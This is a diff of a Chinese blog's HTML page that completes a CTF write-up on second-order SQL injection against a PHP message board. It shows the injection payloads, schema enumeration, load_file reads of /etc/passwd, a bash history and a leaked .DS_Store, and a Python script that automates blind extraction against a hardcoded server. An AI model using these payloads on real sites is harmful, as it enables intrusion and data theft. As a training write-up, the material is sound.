@@ -20,7 +20,8 @@
 <meta property="og:locale" content="zh-cn">
 <meta property="og:image" content="https:&#x2F;&#x2F;s1.ax1x.com&#x2F;2020&#x2F;10&#x2F;21&#x2F;BPnKTP.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;s1.ax1x.com&#x2F;2020&#x2F;10&#x2F;21&#x2F;BPGo1x.md.png">
-<meta property="og:updated_time" content="2020-10-21T19:28:39.426Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;s1.ax1x.com&#x2F;2020&#x2F;10&#x2F;22&#x2F;Bi4wRA.md.png">
+<meta property="og:updated_time" content="2020-10-22T05:41:41.886Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;s1.ax1x.com&#x2F;2020&#x2F;10&#x2F;21&#x2F;BPnKTP.png">
   
@@ -219,7 +220,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">849字</span>
+      <span class="post-count">1.7k字</span>
     </span>
   </span>
 
@@ -228,7 +229,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">4分</span>
+      <span class="post-count">9分</span>
     </span>
   </span>
 </div>
@@ -284,7 +285,52 @@
 <h3 id="SQL-二次注入"><a href="#SQL-二次注入" class="headerlink" title="SQL-二次注入"></a>SQL-二次注入</h3><p>这是截下来的源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>(待写完)</p>
+<p>其中，我们需要注意的是这两段代码，我们可以从中尝试构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">	set category = '$category',	</span></span><br><span class="line"><span class="string">    title = '$title',</span></span><br><span class="line"><span class="string">    content = '$content'"</span>; </span><br><span class="line">$sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">	set category = '$category',</span></span><br><span class="line"><span class="string">	content = '$content',</span></span><br><span class="line"><span class="string">	bo_id = '$bo_id'"</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="二次注入-构造"><a href="#二次注入-构造" class="headerlink" title="二次注入 - /**/构造"></a>二次注入 - /**/构造</h3><p>我们可以尝试插入这样的字符串来构造SQL注入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write页</span></span><br><span class="line">$category = <span class="string">'3\', content=database(),/*'</span>;</span><br><span class="line"><span class="comment"># 3', content = database(),/*</span></span><br><span class="line"><span class="comment"># comment页</span></span><br><span class="line">$content = <span class="string">'*/#'</span>;</span><br><span class="line"><span class="comment"># */#</span></span><br><span class="line"><span class="comment"># 最终的SQL query语句:</span></span><br><span class="line"><span class="comment"># select into comment where category = 3', content = database(),/* and content = ...*/ and bo_id = ...</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3&apos;, content = database(),/*</span><br><span class="line"># ctf</span><br><span class="line">3&apos;, content = (select group_concat(table_name) from information_schema.tables where table_schema = &quot;ctf&quot;),/*</span><br><span class="line"># board,comment,user</span><br><span class="line">3&apos;, content = (select group_concat(column_name) from information_schema.columns where table_schema = &quot;ctf&quot;),/*</span><br><span class="line"># id,category,title,content,id,bo_id,category,content,id,username,password</span><br></pre></td></tr></table></figure>
+
+<p>数据库里的字段都是已知的，看来并不能从中找到flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3&apos;, content = load_file(&quot;/var/www/html/flag.php&quot;),/*</span><br></pre></td></tr></table></figure>
+
+<p>读取不着，要换个思路了。</p>
+<h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><p>尝试使用load_file进行查询，读入linux内文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3&apos;, content = load_file(&quot;/etc/passwd&quot;),/*</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false mysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/false www:x:500:500:www:/home/www:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>看到了/bin/bash，说明当前用户拥有使用终端的权限。</p>
+</blockquote>
+<h3 id="home-www-bash-history-在已知拥有终端权限后"><a href="#home-www-bash-history-在已知拥有终端权限后" class="headerlink" title="/home/www/.bash_history (在已知拥有终端权限后)"></a>/home/www/.bash_history (在已知拥有终端权限后)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3&apos;, content = load_file(&quot;/home/www/.bash_history&quot;),/*</span><br><span class="line"></span><br><span class="line">cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start</span><br></pre></td></tr></table></figure>
+
+<p>发现.DS_Store文件泄露漏洞，开发者只删除了/var/www/html下的.DS_Store，并没有删除/tmp/html下的.DS_Store。</p>
+<h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><blockquote>
+<p><a href="https://www.jianshu.com/p/46f22a29b78d" target="_blank" rel="noopener">关于.DS_Store文件</a></p>
+</blockquote>
+<blockquote>
+<p>简单来说，可以通过.DS_Store看文件目录</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3&apos;, content = hex(load_file(&quot;/tmp/html/.DS_Store&quot;)),/*</span><br></pre></td></tr></table></figure>
+
+<p>得到16进制码，放入16进制-文本字符串转换工具中:</p>
+<p><a href="https://imgchr.com/i/Bi4wRA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/22/Bi4wRA.md.png" alt="Bi4wRA.md.png"></a></p>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag(?)"></a>flag(?)</h3><p>看到了flag.php，复制下来：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag_8946e1ff1ee3e40f.php</span><br><span class="line"></span><br><span class="line">3&apos;, content = hex(load_file(&quot;/tmp/html/flag_8946e1ff1ee3e40f.php&quot;)),/*</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><blockquote>
+<p>以为这题完了？诶，还没完呢~</p>
+</blockquote>
+<p>将flag提交，发现不正确，被忽悠了一手！</p>
+<p>再去/var/www/html目录下看看，又发现了另一个flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3&apos;, content = hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)),/*</span><br></pre></td></tr></table></figure>
+
+<p>提交这个flag，这下才对了。</p>
+<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>因之前unfinish中二次注入的影响，导致我认为二次注入必须写python，使用ascii一个一个按照字母去出，虽然现在明白过来了，但是写的python脚本也不愿就此删掉了，还是放上来扒hhh</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment"># payload = "', content=ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = 'ctf') from 1 for 1)), /*"</span></span><br><span class="line">comment_url=<span class="string">"http://220.249.52.133:30981/write_do.php?do=write"</span></span><br><span class="line">write_url=<span class="string">"http://220.249.52.133:30981/write_do.php?do=comment"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">headers_write = &#123;</span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=1qvvpqhq0o3raukebj5s24f5d6'</span></span><br><span class="line">&#125;</span><br><span class="line">headers_comment = &#123;</span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=1qvvpqhq0o3raukebj5s24f5d6'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">    category = <span class="string">"', content=ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = 'ctf') from %d for 1)), /*"</span>%i</span><br><span class="line">    </span><br><span class="line">    post_comment = &#123;</span><br><span class="line">    <span class="string">'category'</span>: category,</span><br><span class="line">    <span class="string">'title'</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="string">'content'</span>: <span class="string">""</span></span><br><span class="line">    &#125;</span><br><span class="line">    r1 = requests.post(comment_url,data=post_comment,headers=headers_comment)</span><br><span class="line"></span><br><span class="line">    content=<span class="string">"*/#"</span></span><br><span class="line">    </span><br><span class="line">    post_write = &#123;</span><br><span class="line">        <span class="string">'content'</span>: content,</span><br><span class="line">        <span class="string">'bo_id'</span>: i</span><br><span class="line">    &#125;</span><br><span class="line">    r2 = requests.post(write_url, data=post_write, headers=headers_write)</span><br><span class="line">    match = re.search(<span class="string">r'&lt;p&gt;(\d+)&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;'</span>,r2.text)</span><br><span class="line">    asc = match.group(<span class="number">1</span>)</span><br><span class="line">    print(asc)</span><br><span class="line">    <span class="keyword">if</span> asc == <span class="string">'0'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag + chr(int(asc))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
 
     
 
@@ -561,10 +607,6 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">并查集</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">深度优先搜索</a>
               </li>
              
@@ -577,6 +619,10 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">并查集</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">分治法</a>
               </li>
              
@@ -585,19 +631,19 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">模拟</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">字典树</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">最小生成树</a>
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">暴力</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">暴力</a>
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">模拟</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">最小生成树</a>
               </li>
             
             <div class="clearfix"></div>
